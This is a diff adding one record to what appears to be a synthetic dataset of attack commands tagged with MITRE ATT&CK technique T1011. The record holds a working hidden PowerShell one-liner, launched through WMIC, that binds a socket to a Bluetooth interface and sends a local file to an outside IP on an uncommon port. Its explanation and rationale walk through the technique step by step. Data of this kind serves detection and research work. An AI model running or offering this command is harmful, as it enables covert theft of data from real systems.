@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and `$_.Description -like '*Bluetooth*' }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.77',53123); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\sync.dat'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Uses WMIC to spawn a hidden PowerShell that binds a TCP client to a Bluetooth PAN interface and sends a file to an external host over a high, uncommon TCP port. This aligns with T1011 by exfiltrating data via a network medium distinct from the primary LAN.",
+  "rationale_steps": [
+    "Identify a non-primary network medium (Bluetooth PAN) via WMI.",
+    "Select the interface's IPv4 address and bind the socket to that address.",
+    "Establish a TCP connection to an external host on an uncommon port.",
+    "Transmit the selected file's bytes over that alternate medium.",
+    "Avoid system-wide network changes; only the exfil process uses the alternate interface."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-0b247de3",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
